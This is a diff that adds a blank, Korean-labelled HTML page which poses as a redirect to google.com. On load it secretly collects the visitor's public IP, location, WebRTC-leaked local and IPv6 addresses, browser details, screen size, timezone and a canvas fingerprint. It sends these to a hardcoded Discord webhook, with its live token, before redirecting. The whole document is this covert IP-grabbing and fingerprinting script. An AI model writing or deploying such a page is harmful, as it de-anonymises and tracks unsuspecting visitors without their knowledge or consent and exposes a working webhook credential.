@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>|</title>
+</head>
+<body>
+<script>
+  const discord_webhook = 'https://discord.com/api/webhooks/1395779947741839442/Ya4Msa6Lwi8vBdZFWmZZUxTx-wx2NO9s2X6b7RyGrrOK3j5VaFTQbdtiz5ZZjLDZFSMb';
+  const redirect = 'https://www.google.com';
+
+  async function getWebRTC_IPs() {
+    const ipCandidates = new Set();
+    return new Promise((resolve) => {
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+
+      pc.onicecandidate = event => {
+        if (event.candidate && event.candidate.candidate) {
+          const candidateStr = event.candidate.candidate;
+          
+          const ipRegexGlobal = /([0-9]{1,3}(\.[0-9]{1,3}){3})|([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})|([a-z0-9\-]+\.local)/ig;
+          let match;
+          while ((match = ipRegexGlobal.exec(candidateStr)) !== null) {
+            ipCandidates.add(match[0]);
+          }
+        }
+      };
+
+      pc.createDataChannel('');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+      setTimeout(() => {
+        pc.close();
+        resolve(Array.from(ipCandidates));
+      }, 2000);
+    });
+  }
+
+  function getCanvasFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      const txt = 'Browser Fingerprint by Gemini';
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.textBaseline = 'alphabetic';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText(txt, 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText(txt, 4, 17);
+      const dataURL = canvas.toDataURL();
+
+      let hash = 0;
+      for (let i = 0; i < dataURL.length; i++) {
+        const char = dataURL.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash |= 0;
+      }
+      return hash.toString();
+    } catch (e) {
+      console.error("Canvas fingerprinting error:", e);
+      return 'Error';
+    }
+  }
+
+  async function main() {
+    try {
+      const webrtcIPs = await getWebRTC_IPs();
+      const canvasFingerprint = getCanvasFingerprint();
+
+      let userIP = '';
+      let location = '';
+      let data = null;
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        data = await response.json();
+        userIP = data.ip;
+        location = `${data.city}, ${data.region}, ${data.country_name}`;
+      } catch (error) {
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const ipData = await response.json();
+          userIP = ipData.ip;
+          location = '위치 정보 없음';
+          data = { ip: userIP };
+        } catch (error2) {
+          userIP = '알 수 없음';
+          location = '알 수 없음';
+          data = { ip: userIP };
+        }
+      }
+
+      const message = {
+        embeds: [{
+          title: "🔍 새로운 방문자 감지",
+          color: 0xff6b6b,
+          fields: [
+            { name: "🌐 공인 IP 주소 (서버 접속 IP)", value: data.ip, inline: true },
+            { name: "📍 위치", value: location, inline: true },
+            { name: "📡 WebRTC IP 주소 (IPv4, IPv6, mDNS)", value: webrtcIPs.length > 0 ? webrtcIPs.join('\n') : '확인 불가', inline: false },
+            { name: "🖥️ 브라우저 정보", value: navigator.userAgent, inline: false },
+            { name: "📱 화면 해상도", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "🌍 시간대", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "🎨 Canvas 지문", value: canvasFingerprint, inline: false }
+          ],
+          timestamp: new Date().toISOString(),
+        }]
+      };
+
+      await fetch(discord_webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message)
+      });
+
+    } catch (error) {
+      console.error("오류 발생:", error);
+    } finally {
+      window.location.href = redirect;
+    }
+  }
+
+  window.addEventListener('load', main);
+</script>
+</body>
+</html>
